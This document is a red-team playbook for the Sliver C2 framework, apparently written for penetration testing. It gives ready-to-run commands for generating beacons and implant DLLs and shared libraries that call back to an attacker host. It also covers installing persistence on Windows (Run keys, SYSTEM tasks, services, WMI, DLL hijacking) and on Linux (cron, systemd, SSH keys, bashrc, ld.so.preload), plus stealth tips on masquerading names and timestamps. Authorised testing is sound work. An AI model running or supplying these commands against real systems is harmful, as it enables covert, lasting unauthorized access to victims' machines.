# Sliver Persistence Mechanisms

## Overview

Establish persistent C2 access that survives reboots, logoffs, and service
restarts. Uses Sliver beacon mode for resilient callbacks with configurable
jitter and reconnect intervals.

## Prerequisite: Generate Persistent Beacon

```bash
# Generate beacon with resilient reconnect settings
sliver > generate beacon --mtls <KALI_IP>:8888 \
  --os windows --arch amd64 \
  --seconds 60 --jitter 30 \
  --reconnect 300 \
  --max-errors 1000 \
  --name PersistentBeacon \
  --save /tmp/persistent_beacon.exe

# Upload beacon to target
sliver [session] > upload /tmp/persistent_beacon.exe C:\\Windows\\Temp\\svchost_update.exe
```

## Windows Persistence Methods

### 1. Registry Run Key (User-Level)

Executes on user login. No admin required.

```bash
# Add to current user's Run key
sliver [session] > execute -o 'reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdate /t REG_SZ /d "C:\Users\Public\svchost_update.exe" /f'

# Add to all users (requires admin)
sliver [session] > execute -o 'reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdate /t REG_SZ /d "C:\Windows\Temp\svchost_update.exe" /f'

# Verify
sliver [session] > execute -o 'reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdate'

# Cleanup
sliver [session] > execute -o 'reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdate /f'
```

### 2. Scheduled Task (Admin)

More resilient — runs as SYSTEM, survives logoff.

```bash
# Create task that runs on boot as SYSTEM
sliver [session] > execute -o 'schtasks /create /tn "Microsoft\Windows\WindowsUpdate\UpdateCheck" /tr "C:\Windows\Temp\svchost_update.exe" /sc onstart /ru SYSTEM /f'

# Create task that runs on user login
sliver [session] > execute -o 'schtasks /create /tn "Microsoft\Windows\WindowsUpdate\UpdateCheck" /tr "C:\Windows\Temp\svchost_update.exe" /sc onlogon /ru SYSTEM /f'

# Create task with periodic execution (every 15 min)
sliver [session] > execute -o 'schtasks /create /tn "Microsoft\Windows\WindowsUpdate\UpdateCheck" /tr "C:\Windows\Temp\svchost_update.exe" /sc minute /mo 15 /ru SYSTEM /f'

# Verify
sliver [session] > execute -o 'schtasks /query /tn "Microsoft\Windows\WindowsUpdate\UpdateCheck" /v'

# Cleanup
sliver [session] > execute -o 'schtasks /delete /tn "Microsoft\Windows\WindowsUpdate\UpdateCheck" /f'
```

### 3. Windows Service (Admin/SYSTEM)

Most persistent — auto-starts on boot.

```bash
# Create service
sliver [session] > execute -o 'sc create WindowsUpdateSvc binPath= "C:\Windows\Temp\svchost_update.exe" start= auto DisplayName= "Windows Update Service"'

# Start service
sliver [session] > execute -o 'sc start WindowsUpdateSvc'

# Configure auto-restart on failure
sliver [session] > execute -o 'sc failure WindowsUpdateSvc reset= 60 actions= restart/5000/restart/10000/restart/30000'

# Verify
sliver [session] > execute -o 'sc query WindowsUpdateSvc'

# Cleanup
sliver [session] > execute -o 'sc stop WindowsUpdateSvc'
sliver [session] > execute -o 'sc delete WindowsUpdateSvc'
```

### 4. WMI Event Subscription (Stealthy)

Triggers based on system events. Hard to detect.

```bash
# Via SharpPersist
sliver [session] > execute-assembly /opt/tools/SharpPersist.exe -- \
  -t startupfolder -c "C:\Windows\Temp\svchost_update.exe" -f "WindowsUpdate" -m add

# Via WMI (PowerShell)
sliver [session] > execute -o 'powershell -ep bypass -c "$filter = Set-WmiInstance -Class __EventFilter -NameSpace \"root\\subscription\" -Arguments @{Name=\"UpdateFilter\";EventNameSpace=\"root\\cimv2\";QueryLanguage=\"WQL\";Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"}"'
```

### 5. DLL Search Order Hijacking

Replace a DLL that a legitimate program loads from a writable location.

```bash
# Find hijackable DLLs
sliver [session] > execute-assembly /opt/tools/SharpDLLProxy.exe -- \
  --target "C:\Program Files\VulnApp\app.exe"

# Generate DLL implant
sliver > generate --mtls <KALI_IP>:8888 --os windows --arch amd64 \
  --format shared-lib --save /tmp/implant.dll

# Place DLL in the hijackable path
sliver [session] > upload /tmp/implant.dll "C:\Program Files\VulnApp\version.dll"
```

### 6. Startup Folder

```bash
# Current user startup
sliver [session] > upload /tmp/persistent_beacon.exe \
  "C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.exe"

# All users startup (admin)
sliver [session] > upload /tmp/persistent_beacon.exe \
  "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\WindowsUpdate.exe"
```

## Linux Persistence Methods

### 1. Cron Job

```bash
# User cron (runs as current user)
sliver [session] > execute -o 'echo "*/5 * * * * /var/tmp/.cache >/dev/null 2>&1" | crontab -'

# System cron (root)
sliver [session] > execute -o 'echo "*/5 * * * * root /var/tmp/.cache >/dev/null 2>&1" >> /etc/cron.d/system-update'
sliver [session] > execute -o 'chmod 644 /etc/cron.d/system-update'

# Verify
sliver [session] > execute -o 'crontab -l'

# Cleanup
sliver [session] > execute -o 'crontab -r'
sliver [session] > execute -o 'rm -f /etc/cron.d/system-update'
```

### 2. Systemd Service (Root)

```bash
# Create service unit
sliver [session] > execute -o 'cat > /etc/systemd/system/system-update.service << EOF
[Unit]
Description=System Update Daemon
After=network.target

[Service]
Type=simple
ExecStart=/var/tmp/.cache
Restart=always
RestartSec=60
WorkingDirectory=/var/tmp

[Install]
WantedBy=multi-user.target
EOF'

# Enable and start
sliver [session] > execute -o 'systemctl daemon-reload'
sliver [session] > execute -o 'systemctl enable system-update.service'
sliver [session] > execute -o 'systemctl start system-update.service'

# Verify
sliver [session] > execute -o 'systemctl status system-update.service'

# Cleanup
sliver [session] > execute -o 'systemctl stop system-update.service'
sliver [session] > execute -o 'systemctl disable system-update.service'
sliver [session] > execute -o 'rm /etc/systemd/system/system-update.service && systemctl daemon-reload'
```

### 3. SSH Authorized Keys (Root)

```bash
# Generate SSH key pair on Kali
ssh-keygen -t ed25519 -f /tmp/persistence_key -N ""

# Add public key to target
sliver [session] > execute -o 'mkdir -p /root/.ssh && chmod 700 /root/.ssh'
sliver [session] > execute -o 'echo "PUBLIC_KEY_HERE" >> /root/.ssh/authorized_keys'
sliver [session] > execute -o 'chmod 600 /root/.ssh/authorized_keys'

# Also add to regular users
sliver [session] > execute -o 'echo "PUBLIC_KEY_HERE" >> /home/user/.ssh/authorized_keys'

# Cleanup
sliver [session] > execute -o 'sed -i "/UNIQUE_COMMENT/d" /root/.ssh/authorized_keys'
```

### 4. Bashrc / Profile Backdoor

```bash
# Add to bashrc (runs on interactive login)
sliver [session] > execute -o 'echo "nohup /var/tmp/.cache >/dev/null 2>&1 &" >> /home/user/.bashrc'

# Add to profile (runs on all logins)
sliver [session] > execute -o 'echo "nohup /var/tmp/.cache >/dev/null 2>&1 &" >> /etc/profile.d/update.sh'
sliver [session] > execute -o 'chmod +x /etc/profile.d/update.sh'
```

### 5. LD_PRELOAD Hijack

```bash
# Generate shared library implant
sliver > generate --mtls <KALI_IP>:8888 --os linux --arch amd64 \
  --format shared-lib --save /tmp/libupdate.so

# Upload and install
sliver [session] > upload /tmp/libupdate.so /usr/lib/libupdate.so
sliver [session] > execute -o 'echo "/usr/lib/libupdate.so" >> /etc/ld.so.preload'

# Cleanup
sliver [session] > execute -o 'sed -i "/libupdate.so/d" /etc/ld.so.preload'
sliver [session] > execute -o 'rm /usr/lib/libupdate.so'
```

### 6. Init.d Script (Legacy Systems)

```bash
sliver [session] > execute -o 'cat > /etc/init.d/system-update << EOF
#!/bin/sh
### BEGIN INIT INFO
# Provides:          system-update
# Required-Start:    \$network
# Default-Start:     2 3 4 5
# Short-Description: System Update Daemon
### END INIT INFO
/var/tmp/.cache &
EOF'
sliver [session] > execute -o 'chmod +x /etc/init.d/system-update'
sliver [session] > execute -o 'update-rc.d system-update defaults'
```

## Persistence Verification

```bash
# Test: reboot the target
sliver [session] > execute -o 'shutdown /r /t 5'   # Windows
sliver [session] > execute -o 'reboot'              # Linux

# Wait for beacon callback (may take 1-5 minutes depending on interval)
sliver > beacons

# Verify new session is from persisted implant
sliver > use <NEW_BEACON_ID>
sliver [beacon] > info
sliver [beacon] > whoami
```

## Persistence Stealth Tips

1. **Use beacon mode** — periodic callbacks are stealthier than persistent sessions
2. **Mimic legitimate names** — "svchost_update.exe", "system-update", etc.
3. **Store in system directories** — C:\Windows\Temp, /var/tmp, /usr/lib
4. **Match file timestamps** — `touch -r /bin/ls /var/tmp/.cache` (Linux)
5. **Multiple mechanisms** — install 2-3 different persistence types as backup
6. **Document everything** — create cleanup checklist for engagement end

## Evidence Collection

- Each persistence mechanism installed (type, path, trigger)
- Reboot survival test results
- Session reconnection timestamps
- Complete cleanup commands for each mechanism
